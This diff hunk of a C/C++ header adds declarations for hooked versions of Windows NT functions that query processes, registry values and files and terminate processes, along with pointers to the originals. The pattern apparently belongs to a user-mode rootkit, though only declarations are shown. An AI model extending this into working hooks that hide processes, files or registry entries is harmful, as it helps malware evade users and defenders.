@@ -99,3 +99,15 @@ DWORD GetPPID(DWORD);
 int GetProcessName(DWORD, char*, DWORD);
 bool IsExplorerProcess(void);
 PWCHAR KeyValueInformationGetName(LPVOID, NT_KEY_VALUE_INFORMATION_CLASS);
+
+NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE, UINT);
+NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE, ULONG, NT_KEY_VALUE_INFORMATION_CLASS, LPVOID, ULONG, PULONG resultLength);
+NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE, PUNICODE_STRING, NT_KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+NTSTATUS WINAPI HookedNtOpenFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
+
+static pNtQuerySystemInformation OriginalNtQuerySystemInformation = nullptr;
+static pNtTerminateProcess OriginalNtTerminateProcess = nullptr;
+static pNtEnumerateValueKey OriginalNtEnumerateValueKey = nullptr;
+static pNtQueryValueKey OriginalNtQueryValueKey = nullptr;
+static pNtOpenFile OriginalNtOpenFile = nullptr;
